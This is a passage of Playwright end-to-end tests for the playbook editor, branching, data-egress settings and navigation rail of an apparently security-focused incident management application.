  await copy.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Delete' }).click()
  await expect(nodes).toHaveCount(2)

  // The trigger is never copied or deleted, and the menu says why.
  await nodes.filter({ hasText: 'by hand' }).click({ button: 'right' })
  const kept = menu.getByRole('menuitem', { name: 'Delete' })
  await expect(kept).toHaveAttribute('aria-disabled', 'true')
  await expect(kept).toHaveAttribute('title', 'A playbook keeps its trigger')
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)

  // Without a pointer: Shift+F10 on the node that has the focus.
  await nodes.filter({ hasText: 'Write it down' }).focus()
  await page.keyboard.press('Shift+F10')
  await expect(menu).toContainText('Write it down')
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)

  // On the empty canvas: a node is added where the click was.
  const frame = await canvas.boundingBox()
  await canvas.click({ button: 'right', position: { x: 70, y: 50 } })
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Add a node here…',
    'Paste herectrl v',
    'Select allctrl a',
    'Fit the view',
    'Tidy up',
    'Undoctrl z',
    'Redoctrl shift z',
    ...GENERAL_MENU,
  ])
  await menu.getByRole('menuitem', { name: 'Add a node here…' }).click()
  const add = page.getByRole('dialog', { name: 'Add a node' })
  await add.getByLabel('Search the nodes to add').fill('finish the run')
  await expect(add.getByRole('button', { name: /^End/ })).toHaveCount(1)
  await page.keyboard.press('Enter')
  await expect(add).toBeHidden()
  await expect(nodes).toHaveCount(3)
  const landed = await nodes.filter({ hasText: 'End' }).boundingBox()
  expect(Math.abs(landed.x - (frame.x + 70))).toBeLessThan(4)
  expect(Math.abs(landed.y - (frame.y + 50))).toBeLessThan(4)

  // What was copied is pasted where the next click is.
  await nodes.filter({ hasText: 'Write it down' }).click({ button: 'right' })
  await menu.getByRole('menuitem', { name: /^Copy\s*ctrl c$/ }).click()
  await canvas.click({ button: 'right', position: { x: 70, y: 150 } })
  await menu.getByRole('menuitem', { name: 'Paste here' }).click()
  await expect(nodes).toHaveCount(4)

  // The line that has the focus gives its menu to the keyboard too.
  await edges.first().focus()
  await page.keyboard.press('Shift+F10')
  await expect(menu.getByRole('menuitem')).toHaveText(['Delete this connectiondel', ...GENERAL_MENU])
  await page.keyboard.press('Escape')
  await expect(menu).toHaveCount(0)

  // On a line: it is deleted. (The pointer on its middle: a path of no width is not something to click.)
  const middle = await edges
    .first()
    .locator('.react-flow__edge-interaction')
    .evaluate((path) => {
      const at = path.getPointAtLength(path.getTotalLength() / 2)
      const point = new DOMPoint(at.x, at.y).matrixTransform(path.getScreenCTM())
      return { x: point.x, y: point.y }
    })
  await page.mouse.click(middle.x, middle.y, { button: 'right' })
  await expect(menu.getByRole('menuitem')).toHaveText(['Delete this connectiondel', ...GENERAL_MENU])
  await expect(menu).toContainText('Trigger → Write it down')
  await menu.getByRole('menuitem', { name: 'Delete this connection' }).click()
  await expect(edges).toHaveCount(0)

  // What was saved holds no corner any more: they went when the graph was next saved.
  await expect(area.getByText('draft saved')).toBeVisible()
  const keptDraft = (await (await page.request.get(`/api/automation/playbooks/${playbookId}`)).json()).draft
  expect(keptDraft.nodes).toHaveLength(4)
  expect(JSON.stringify(keptDraft)).not.toContain('points')

  await area.getByRole('button', { name: 'All playbooks' }).click()
  expect((await page.request.delete(`/api/automation/playbooks/${playbookId}`)).status()).toBe(204)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('Tidy up puts the nodes in order and takes every line round the nodes it does not join', async () => {
  // A "for each" with two nodes in its body, and "when done" that goes past them: all in one column, as they
  // would be after being added one under the other.
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Lines and blocks' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const at = (row) => ({ x: 40, y: 40 + row * 118 })
  const action = (id, name, row, what, args) => ({
    id,
    kind: 'action',
    name,
    position: at(row),
    config: { action: what, args },
  })
  const draft = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: at(0), config: { manual: true } },
      {
        id: 'each',
        kind: 'for_each',
        name: 'For each',
        position: at(1),
        config: { items: '{{ inputs.rows }}', max: 500 },
      },
      action('made', 'Create an incident', 2, 'nik.create-incident', { title: '{{ item }}' }),
      action('status', 'Set the status', 3, 'nik.set-status', {
        incident: '{{ made.incident }}',
        status: 'in_progress',
      }),
      { id: 'end', kind: 'end', name: 'End', position: at(4), config: { status: 'done', message: '' } },
    ],
    edges: [
      { from: 'start', to: 'each' },
      { from: 'each', port: 'each', to: 'made' },
      { from: 'made', to: 'status' },
      { from: 'status', to: 'end' },
      { from: 'each', port: 'done', to: 'end' },
    ],
  }
  expect((await page.request.put(`/api/automation/playbooks/${playbookId}`, { data: { draft } })).status()).toBe(200)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
  await area
    .getByRole('row')
    .filter({ hasText: 'Lines and blocks' })
    .getByRole('button', { name: 'Lines and blocks' })
    .click()
  const canvas = area.getByTestId('playbook-canvas')
  await expect(canvas.locator('.react-flow__node')).toHaveCount(5)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(5)

  // What is drawn, read from the page: the box of each node, each line as points along it, the words of the lines.
  const drawn = () =>
    canvas.evaluate((root) => {
      const box = (element) => {
        const found = element.getBoundingClientRect()
        return { x: found.x, y: found.y, width: found.width, height: found.height }
      }
      const boxes = [...root.querySelectorAll('.react-flow__node')].map((element) => ({
        id: element.dataset.id,
        ...box(element),
      }))
      const lines = [...root.querySelectorAll('.react-flow__edge')].map((element) => {
        const [, from, to] = /^From (\S+) to ([^,\s]+)/.exec(element.getAttribute('aria-label'))
        const path = element.querySelector('.react-flow__edge-path')
        const matrix = path.getScreenCTM()
        const length = path.getTotalLength()
        const points = []
        for (let along = 0; along <= length; along += 2) {
          const point = path.getPointAtLength(along).matrixTransform(matrix)
          points.push({ x: point.x, y: point.y })
        }
        return { from, to, points }
      })
      const labels = [...root.querySelectorAll('.react-flow__edgelabel-renderer span')].map((element) => ({
        from: 'the words',
        to: element.textContent,
        ...box(element),
      }))
      return { boxes, lines, labels }
    })

  await area.getByRole('button', { name: 'Tidy up' }).click()
  await expect(area.getByText('draft saved')).toBeVisible()
  const tidied = await drawn()
  expect(tidied.boxes).toHaveLength(5)
  expect(tidied.lines).toHaveLength(5)
  expect(tidied.labels.map((label) => label.to).sort()).toEqual(['for each item', 'when done'])
  // No line passes over a node it does not join, and no words sit on a node.
  expect(crossings(tidied.boxes, tidied.lines, tidied.labels)).toEqual([])
  // "when done" does not go straight down any more: it has a lane beside the body of the loop.
  const done = tidied.lines.find((line) => line.from === 'each' && line.to === 'end')
  const body = tidied.boxes.find((found) => found.id === 'status')
  const passes = done.points.filter((point) => point.y > body.y && point.y < body.y + body.height)
  expect(passes.length).toBeGreaterThan(0)
  expect(passes.every((point) => point.x < body.x || point.x > body.x + body.width)).toBe(true)
  // The route is the layout's: kept with the draft, with nothing on the line to drag.
  const kept = (await (await page.request.get(`/api/automation/playbooks/${playbookId}`)).json()).draft
  expect(kept.edges.every((edge) => edge.route.points.length >= 2)).toBe(true)
  await expect(canvas.getByRole('button', { name: /corner/i })).toHaveCount(0)

  // A node moved by hand: its lines forget their route and are drawn by the canvas; the others keep theirs.
  await canvas.locator('.react-flow__node').filter({ hasText: 'Set the status' }).focus()
  await page.keyboard.press('Enter')
  await page.keyboard.press('ArrowRight')
  await expect(area.getByText('draft saved')).toBeVisible()
  await expect
    .poll(async () => {
      const now = (await (await page.request.get(`/api/automation/playbooks/${playbookId}`)).json()).draft
      return now.edges.filter((edge) => edge.route).map((edge) => `${edge.from} ${edge.to}`)
    })
    .toEqual(['start each', 'each made', 'each end'])

  await area.getByRole('button', { name: 'All playbooks' }).click()
  expect((await page.request.delete(`/api/automation/playbooks/${playbookId}`)).status()).toBe(204)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('typing {{ in a node offers what is inside the incident another node gave, and a field made in Settings; an admin lets attachments and e-mail bodies leave from the screen', async () => {
  const field = await page.request.post('/api/fields', {
    data: { name: 'e2e_unit', label: 'E2E unit', type: 'text', allTypes: true },
  })
  expect(field.status()).toBe(201)
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Reads an incident' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const action = (id, name, y, what, args) => ({
    id,
    kind: 'action',
    name,
    position: { x: 40, y },
    config: { action: what, args },
  })
  const draft = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      action('made', 'Open a case', 160, 'nik.create-incident', { title: 'From a playbook' }),
      action('status', 'Mark it', 280, 'nik.set-status', { status: 'in_progress' }),
    ],
    edges: [
      { from: 'start', to: 'made' },
      { from: 'made', to: 'status' },
    ],
  }
  expect((await page.request.put(`/api/automation/playbooks/${playbookId}`, { data: { draft } })).status()).toBe(200)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
  await area
    .getByRole('row')
    .filter({ hasText: 'Reads an incident' })
    .getByRole('button', { name: 'Reads an incident' })
    .click()
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  await area.getByTestId('playbook-canvas').locator('.react-flow__node').filter({ hasText: 'Mark it' }).click()

  // "Pick a value" lists the incident the node before gave, and what is inside it.
  const incident = inspector.getByLabel('incident', { exact: true })
  await inspector.getByRole('button', { name: 'Pick a value' }).first().click()
  const picker = page.getByRole('dialog', { name: 'Pick a value' })
  const given = picker.getByRole('group', { name: 'Open a case' })
  await expect(given.getByText('made.incident', { exact: true })).toBeVisible()
  for (const part of ['id', 'name', 'status', 'severity', 'assignee', 'host', 'created']) {
    await expect(given.getByText(`made.incident.${part}`, { exact: true })).toBeVisible()
  }
  await page.keyboard.press('Escape')
  await expect(picker).toHaveCount(0)

  // Typed: the braces open the same values under the field, narrowed by what follows them.
  await incident.fill('{{ made.incident.')
  const offered = inspector.getByRole('listbox', { name: 'Values that complete what is typed' })
  await expect(offered.getByRole('option').first()).toHaveText(/^made\.incident\.id/)
  await expect(offered.getByRole('option', { name: /^made\.incident\.name/ })).toBeVisible()
  await page.keyboard.press('Enter')
  await expect(incident).toHaveValue('{{ made.incident.id }}')
  await expect(offered).toHaveCount(0)
  // The fields of the incident of the run: the registry, with the field made a moment ago.
  await incident.fill('{{ incident.')
  await expect(offered.getByRole('option', { name: /^incident\.owner/ })).toBeVisible()
  await incident.fill('{{ incident.e2e')
  await expect(offered.getByRole('option')).toHaveCount(1)
  await offered.getByRole('option', { name: /^incident\.e2e_unit/ }).click()
  await expect(incident).toHaveValue('{{ incident.e2e_unit }}')
  await incident.fill('{{ made.incident.id }}')

  // Settings: e-mail bodies, attachments and samples stand apart from the rest; an admin opens one behind the double check.
  await area.getByRole('radio', { name: 'Settings' }).click()
  const data = area.getByRole('region', { name: 'Data that may leave' })
  const files = data.getByRole('list', { name: 'Whole messages and files that may leave' })
  await expect(files.getByRole('listitem')).toHaveCount(3)
  await expect(data).toContainText('A sample is live malware.')
  await expect(data).toContainText('needed by a playbook that forwards mail')
  // TLP:RED data is never offered.
  await expect(data).toContainText('TLP:RED data.')
  await expect(data.getByRole('button', { name: /TLP/ })).toHaveCount(0)
  await files.getByRole('button', { name: 'Open: Attachments' }).click()
  const open = page.getByRole('dialog', { name: 'Let attachments leave Nik in this playbook?' })
  await expect(open).toContainText('leaves Nik whole')
  const allow = open.getByRole('button', { name: 'Allow attachments' })
  await expect(allow).toBeDisabled()
  await open.getByRole('checkbox').check()
  await open.locator('#data-guard-name').fill('Reads an incident')
  await allow.click()
  await expect(open).toBeHidden()
  await expect(files.getByText('may leave', { exact: true })).toBeVisible()
  const detail = async () => (await page.request.get(`/api/automation/playbooks/${playbookId}`)).json()
  expect((await detail()).dataAllow).toEqual(['attachment'])
  // The text of e-mails, which a playbook that forwards mail needs, is opened the same way.
  await files.getByRole('button', { name: 'Open: E-mail bodies' }).click()
  const bodies = page.getByRole('dialog', { name: 'Let e-mail bodies leave Nik in this playbook?' })
  await bodies.getByRole('checkbox').check()
  await bodies.locator('#data-guard-name').fill('Reads an incident')
  await bodies.getByRole('button', { name: 'Allow e-mail bodies' }).click()
  await expect(bodies).toBeHidden()
  await expect(files.getByText('may leave', { exact: true })).toHaveCount(2)
  expect((await detail()).dataAllow).toEqual(['mail_body', 'attachment'])
  // Each is closed again with one click.
  await files.getByRole('button', { name: 'Close: Attachments' }).click()
  await expect(files.getByText('may leave', { exact: true })).toHaveCount(1)
  await files.getByRole('button', { name: 'Close: E-mail bodies' }).click()
  await expect(files.getByText('may leave', { exact: true })).toHaveCount(0)
  expect((await detail()).dataAllow).toEqual([])
  // Both are in the audit log, with the name of who did it.
  const audit = await (await page.request.get('/api/audit?q=action:automation.data.*')).json()
  expect(
    audit.entries.filter((entry) => entry.details.includes('Reads an incident')).map((entry) => entry.action),
  ).toEqual(['automation.data.close', 'automation.data.close', 'automation.data.open', 'automation.data.open'])

  await area.getByRole('button', { name: 'All playbooks' }).click()
  expect((await page.request.delete(`/api/automation/playbooks/${playbookId}`)).status()).toBe(204)
  expect((await page.request.delete('/api/fields/e2e_unit')).status()).toBeLessThan(300)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('a playbook and a script are deleted from their menu, and a draft is thrown away', async () => {
  const graph = (text) => ({
    nodes: [
      { id: 'start', kind: 'trigger', name: 'start', config: { manual: true } },
      { id: 'say', kind: 'action', name: 'say', config: { action: 'nik.add-note', args: { text } } },
    ],
    edges: [{ from: 'start', to: 'say' }],
  })
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'To be deleted' } })).json()
  const saved = await page.request.post(`/api/automation/playbooks/${made.id}/versions`, {
    data: { graph: graph('one') },
  })
  expect(saved.status()).toBe(201)
  await page.request.put(`/api/automation/playbooks/${made.id}`, { data: { draft: graph('half done') } })
  const script = await page.request.post('/api/automation/scripts', { data: { name: 'ToBeDeleted' } })
  expect(script.status()).toBe(201)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  // The draft first: thrown away, the playbook is its version in use again.
  await area.getByRole('button', { name: 'To be deleted' }).click()
  await area.getByRole('button', { name: 'discard the draft' }).click()
  const discard = page.getByRole('dialog', { name: 'Discard the draft?' })
  await discard.getByRole('button', { name: 'Discard', exact: true }).click()
  await expect(area.getByRole('button', { name: 'discard the draft' })).toHaveCount(0)
  expect((await (await page.request.get(`/api/automation/playbooks/${made.id}`)).json()).draft).toBeNull()
  await area.getByRole('button', { name: 'All playbooks' }).click()

  const row = area.getByRole('row').filter({ hasText: 'To be deleted' })
  await row.click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Delete…' }).click()
  const confirm = page.getByRole('dialog', { name: 'Delete this playbook?' })
  await expect(confirm).toContainText('To be deleted')
  await confirm.getByRole('button', { name: 'Delete', exact: true }).click()
  await expect(row).toHaveCount(0)

  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  const scriptRow = area.getByRole('row').filter({ hasText: 'ToBeDeleted' })
  await scriptRow.click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Delete…' }).click()
  await page
    .getByRole('dialog', { name: 'Delete this script?' })
    .getByRole('button', { name: 'Delete', exact: true })
    .click()
  await expect(scriptRow).toHaveCount(0)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('a branch of a playbook is made, pushed over a main that moved on, and deleted', async () => {
  const graph = (text) => ({
    nodes: [
      { id: 'start', kind: 'trigger', name: 'start', config: { manual: true } },
      { id: 'say', kind: 'action', name: 'say', config: { action: 'nik.add-note', args: { text } } },
    ],
    edges: [{ from: 'start', to: 'say' }],
  })
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'Branched one' } })).json()
  const url = `/api/automation/playbooks/${made.id}`
  expect((await page.request.post(`${url}/versions`, { data: { graph: graph('one') } })).status()).toBe(201)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Branched one' }).click()
  // The side panel names the playbooks; the one that is open shows main, which is where we are.
  const tree = area.getByRole('navigation', { name: 'Playbooks and their branches' })
  await expect(tree.getByRole('button', { name: /^main/ })).toHaveAttribute('aria-current', 'page')
  await tree.getByRole('button', { name: 'New branch' }).click()
  const naming = page.getByRole('dialog', { name: 'New branch' })
  await naming.getByLabel('Name').fill('louder')
  await naming.getByRole('button', { name: 'Make the branch' }).click()

  // The branch has an address of its own, and the editor says where it is.
  await expect(page).toHaveURL(/\/automation\/playbooks\/[^/]+\/branches\/[^/]+$/)
  await expect(area.getByText('branch: louder')).toBeVisible()
  await expect(tree.getByRole('button', { name: /^louder/ })).toHaveAttribute('aria-current', 'page')
  await expect(area.getByRole('button', { name: /Save as version/ })).toHaveCount(0)
  await expect(area.getByRole('button', { name: 'Push to main…' })).toBeVisible()

  // The branch is worked on, and meanwhile main gets a version of its own.
  const [branch] = (await (await page.request.get(url)).json()).branches
  expect(branch.name).toBe('louder')
  await page.request.put(`${url}/branches/${branch.id}`, { data: { graph: graph('two') } })
  expect((await page.request.post(`${url}/versions`, { data: { graph: graph('three') } })).status()).toBe(201)
  // Main and back: the editor reads the branch again.
  await tree.getByRole('button', { name: /^main/ }).click()
  await expect(area.getByText('branch: louder')).toHaveCount(0)
  await expect(area.getByText(/playbook · version 2/)).toBeVisible()
  await tree.getByRole('button', { name: /^louder/ }).click()
  await expect(area.getByText('branch: louder')).toBeVisible()
  await expect(area.getByText(/started from version 1/)).toBeVisible()

  // Pushing says the playbook moved on, and replaces it only when told.
  await area.getByRole('button', { name: 'Push to main…' }).click()
  const push = page.getByRole('dialog', { name: /Push .louder. to main\?/ })
  await push.getByLabel('Note').fill('Louder words')
  await push.getByRole('button', { name: 'Push', exact: true }).click()
  const moved = page.getByRole('dialog', { name: 'The playbook moved on' })
  await expect(moved).toContainText('at version 2')
  expect((await (await page.request.get(url)).json()).version).toBe(2)
  await moved.getByRole('button', { name: 'Push over it' }).click()
  await expect(moved).toHaveCount(0)
  await expect(area.getByText(/playbook · version 3/)).toBeVisible()
  const after = await (await page.request.get(url)).json()
  expect(after.version).toBe(3)
  expect(after.graph.nodes[1].config.args.text).toBe('two')
  expect(after.branches[0].behind).toBe(false)

  // The list shows the branch under its playbook, and opens it.
  await area.getByRole('button', { name: 'All playbooks' }).click()
  const branches = area.getByRole('list', { name: 'Branches of Branched one' })
  await expect(branches).toContainText('louder')
  await branches.getByRole('button', { name: 'louder' }).click()
  await expect(area.getByText('branch: louder')).toBeVisible()
  await area.getByRole('button', { name: 'Delete branch…' }).click()
  await page
    .getByRole('dialog', { name: 'Delete this branch?' })
    .getByRole('button', { name: 'Delete', exact: true })
    .click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[^/]+$/)
  await expect(area.getByText('branch: louder')).toHaveCount(0)
  expect((await (await page.request.get(url)).json()).branches).toEqual([])

  expect((await page.request.delete(url)).status()).toBe(204)
  await area.getByRole('button', { name: 'All playbooks' }).click()
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('a branch is compared with main before it is pushed, and runs only in the debugger', async () => {
  const start = { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } }
  const note = (id, name, y, text) => ({
    id,
    kind: 'action',
    name,
    position: { x: 40, y },
    config: { action: 'nik.add-note', args: { text } },
  })
  const main = (text) => ({ nodes: [start, note('say', 'Say it', 160, text)], edges: [{ from: 'start', to: 'say' }] })
  // The branch says something else, and says more after it.
  const longer = {
    nodes: [start, note('say', 'Say it', 160, 'two'), note('more', 'Say more', 280, 'and more')],
    edges: [
      { from: 'start', to: 'say' },
      { from: 'say', to: 'more' },
    ],
  }
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'Compared one' } })).json()
  const url = `/api/automation/playbooks/${made.id}`
  expect((await page.request.post(`${url}/versions`, { data: { graph: main('one') } })).status()).toBe(201)
  const branch = await page.request.post(`${url}/branches`, { data: { name: 'longer', graph: longer } })
  expect(branch.status()).toBe(201)
  const branchId = (await branch.json()).id
  // Nothing but the debugger starts a branch, whoever asks.
  expect((await page.request.post(`${url}/run`, { data: { branch: branchId, dryRun: true } })).status()).toBe(400)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('list', { name: 'Branches of Compared one' }).getByRole('button', { name: 'longer' }).click()
  await expect(area.getByText('branch: longer')).toBeVisible()
  // On a branch nothing runs but the debugger: no "Run…", no switch.
  await expect(area.getByText(/runs only in the debugger/)).toBeVisible()
  await expect(area.getByRole('button', { name: 'Debug…' })).toBeEnabled()
  await expect(area.getByRole('button', { name: 'Run…' })).toHaveCount(0)
  await expect(area.getByRole('switch', { name: /^The playbook is / })).toHaveCount(0)

  // Main beside the branch: the counts, the marks on each side, the list of the changes.
  await area.getByRole('button', { name: 'Compare with main', exact: true }).click()
  const compare = area.getByRole('region', { name: 'Compare with main' })
  await expect(compare.getByRole('heading', { name: /Compare main v1 with the branch longer/ })).toBeVisible()
  const counts = compare.getByRole('list', { name: 'What differs' })
  await expect(counts).toContainText('+1 added')
  await expect(counts).toContainText('~1 changed')
  await expect(counts).not.toContainText('removed')
  await expect(compare.getByRole('note')).toHaveCount(0)
  await expect(compare.getByRole('region', { name: 'Main' }).locator('.react-flow__node')).toHaveCount(2)
  await expect(
    compare.getByRole('region', { name: 'Main' }).locator('.react-flow__node[aria-label$=", changed"]'),
  ).toHaveCount(1)
  const right = compare.getByRole('region', { name: 'Branch' })
  await expect(right.locator('.react-flow__node')).toHaveCount(3)
  await expect(right.locator('.react-flow__node[aria-label$=", added"]')).toContainText('+')
  await expect(right.locator('.react-flow__node[aria-label$=", changed"]')).toContainText('~')
  const changes = compare.getByRole('list', { name: 'All the changes' })
  await expect(changes.getByRole('listitem')).toHaveCount(2)
  await expect(changes.getByRole('button', { name: '+ Say more, added' })).toBeVisible()
  // The changed node, field by field: what it was, what it is.
  await changes.getByRole('button', { name: '~ Say it, changed' }).click()
  await expect(changes.getByRole('button', { name: '~ Say it, changed' })).toHaveAttribute('aria-pressed', 'true')
  const fields = compare.getByLabel('Fields of the chosen node')
  await expect(fields).toContainText('args.text')
  await expect(fields).toContainText('- one')
  await expect(fields).toContainText('+ two')
  await expect(fields).toContainText('nik.add-note · same')
  await compare.getByRole('button', { name: 'Back to the branch' }).click()
  await expect(compare).toHaveCount(0)

  // Main gets a version meanwhile. The push offers the comparison, which says the left side is main as it is now.
  expect((await page.request.post(`${url}/versions`, { data: { graph: main('uno') } })).status()).toBe(201)
  await area.getByRole('button', { name: 'Push to main…' }).click()
  await page
    .getByRole('dialog', { name: /Push .longer. to main\?/ })
    .getByRole('button', { name: 'Compare with main first' })
    .click()
  await expect(compare.getByRole('note')).toContainText('main moved since this branch was made (v1 to v2)')
  await compare.getByRole('button', { name: '~ Say it, changed' }).click()
  await expect(compare.getByLabel('Fields of the chosen node')).toContainText('- uno')
  await compare.getByRole('button', { name: 'Push to main…' }).click()
  await page
    .getByRole('dialog', { name: /Push .longer. to main\?/ })
    .getByRole('button', { name: 'Push', exact: true })
    .click()
  await page
    .getByRole('dialog', { name: 'The playbook moved on' })
    .getByRole('button', { name: 'Push over it' })
    .click()
  // Pushed: back on the branch, which is what main is now.
  await expect(compare).toHaveCount(0)
  await expect(area.getByText(/playbook · version 3/)).toBeVisible()
  const after = await (await page.request.get(url)).json()
  expect(after.version).toBe(3)
  expect(after.graph.nodes.map((item) => item.id)).toEqual(['start', 'say', 'more'])
  await area.getByRole('button', { name: 'Compare with main', exact: true }).click()
  await expect(compare.getByRole('list', { name: 'What differs' })).toHaveText('nothing differs')
  await compare.getByRole('button', { name: 'Back to the branch' }).click()

  // "Debug…" on the branch: a debug run of the branch, which says so.
  await area.getByRole('button', { name: 'Debug…' }).click()
  const ask = page.getByRole('dialog', { name: 'Debug "Compared one"' })
  await expect(ask).toContainText('The branch longer, as it is saved')
  await ask.getByRole('button', { name: 'Start debugging' }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  await expect(area.getByText('branch: longer')).toBeVisible()
  const debug = area.getByRole('region', { name: 'Debugger' })
  await expect(debug.getByRole('status')).toContainText('Stopped before Say it.', { timeout: 20_000 })
  await expect(debug.getByRole('status')).toContainText('It runs the branch longer')
  const runId = page.url().split('/').pop()
  const run = await (await page.request.get(`/api/automation/runs/${runId}`)).json()
  expect(run.branch).toEqual({ id: branchId, name: 'longer' })
  expect(run.debug.branch).toBe('longer')
  expect((await page.request.post(`/api/automation/runs/${runId}/debug`, { data: { action: 'stop' } })).status()).toBe(
    200,
  )
  // The list of the debug runs names the branch; from the run, the playbook opens on it.
  await area.getByRole('button', { name: 'its branch longer' }).click()
  await expect(page).toHaveURL(new RegExp(`/automation/playbooks/${made.id}/branches/${branchId}$`))
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Runs' }).click()
  await area.getByLabel('Debug runs').check()
  await expect(area.getByRole('row').filter({ hasText: 'Compared one' })).toContainText('branch: longer')

  expect((await page.request.delete(url)).status()).toBe(204)
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('the rail: its order, the search bar in the header, and the account at its foot', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  // Every incident of the list has its number, opened in this visit or not.
  await openIncidentList()
  const listed = page.getByRole('table', { name: 'Incidents' }).locator('tbody tr')
  await expect(listed.first()).toBeVisible()
  for (const text of await listed.allTextContents()) expect(text).toMatch(/#\d{5}/)
  // The entry of the list shows it is open; pressed again it does nothing, and Back returns to the incident.
  const entry = rail.getByRole('button', { name: 'Incidents', exact: true })
  await expect(entry).toHaveAttribute('aria-pressed', 'true')
  await entry.click()
  await expect(page.getByRole('table', { name: 'Incidents' })).toBeVisible()
  await page.goBack()
  await expect(page.getByRole('banner').getByText(/^#\d{5}$/)).toBeVisible()
  const labels = await rail
    .getByRole('button')
    .evaluateAll((buttons) => buttons.map((button) => button.getAttribute('aria-label').replace(/ \(.*$/, '')))
  // From the top, then the foot: notifications, Settings, the account. No shortcut to a section of Settings.
  expect(labels.map((label) => label.split(':')[0])).toEqual([
    'Dashboards',
    'Incidents',
    'My tasks',
    'Artifacts',
    'Indicators',
    'Automations',
    'Playground',
    'Notifications',
    'Platform settings',
    'Account',
  ])
  // No entry says it closes or hides anything, and the search is not on the rail.
  for (const label of labels) expect(label).not.toMatch(/^(Close|Hide|Search)/)
  // The search is a bar in the middle of the header, on the incident and on every page of the rail.
  const centred = async (where) => {
    const bar = where.getByRole('button', { name: 'Search', exact: true })
    await expect(bar).toBeVisible()
    await expect(bar).toContainText('Search')
    const [box, header] = [await bar.boundingBox(), await where.boundingBox()]
    expect(Math.abs(box.x + box.width / 2 - (header.x + header.width / 2))).toBeLessThan(header.width * 0.08)
    await bar.click()
    await expect(page.getByRole('dialog', { name: 'Search' })).toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('dialog', { name: 'Search' })).toHaveCount(0)
  }
  await centred(page.getByRole('banner'))
  for (const [open, region, close] of [
    ['Dashboards', 'Dashboards', 'Close dashboards'],
    [/^My tasks/, 'My tasks', 'Close my tasks'],
    [/^Automations/, 'Automations', 'Close automations'],
    ['Playground', 'Playground', 'Close the playground'],
    ['Platform settings', 'Settings', 'Close settings'],
  ]) {
    await rail.getByRole('button', { name: open }).click()
    await centred(page.getByRole('region', { name: region, exact: true }).locator('header').first())
    await page.getByRole('button', { name: close }).click()
  }
  // Ctrl+K opens the same search.
  await page.keyboard.press('Control+k')
  await expect(page.getByRole('dialog', { name: 'Search' })).toBeVisible()
  await page.keyboard.press('Escape')
  for (const gone of ['Audit log', 'Users', 'Full backup']) {
    await expect(rail.getByRole('button', { name: gone, exact: true })).toHaveCount(0)
  }
  // The account says who is signed in, opens one's own section and signs out.
  await rail.getByRole('button', { name: /^Account: admin/ }).click()
  const menu = page.getByRole('menu')
  await expect(menu).toContainText('admin')
  await expect(menu.getByRole('menuitem')).toHaveText(['My account', 'Sign out'])
  await menu.getByRole('menuitem', { name: 'My account' }).click()
  await expect(page).toHaveURL(/\/settings\/.*my-account$/)
  await page.getByRole('button', { name: 'Close settings' }).click()
})

test('an entry of the rail always shows the first screen of its section, and does nothing there', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const entry = (name) => rail.getByRole('button', { name })
  const number = (
    await page
      .getByRole('banner')
      .getByText(/^#\d{5}$/)
      .textContent()
  ).trim()
  const incidentUrl = page.url()

  // ---- Automations: the playbooks, from the editor, a tab of a playbook, the runs and the scripts ----
  const made = await (await page.request.post('/api/automation/playbooks', { data: { name: 'Home again' } })).json()
  await entry(/^Automations/).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  await expect(entry(/^Automations/)).toHaveAttribute('aria-pressed', 'true')
  // On its first screen the entry does nothing: the page is not closed.
  await entry(/^Automations/).click()
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  await expect(area).toBeVisible()
  await area.getByRole('row').filter({ hasText: 'Home again' }).getByRole('button').first().click()
  await expect(page).toHaveURL(new RegExp(`/automation/playbooks/${made.id}$`))
  await entry(/^Automations/).click()
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
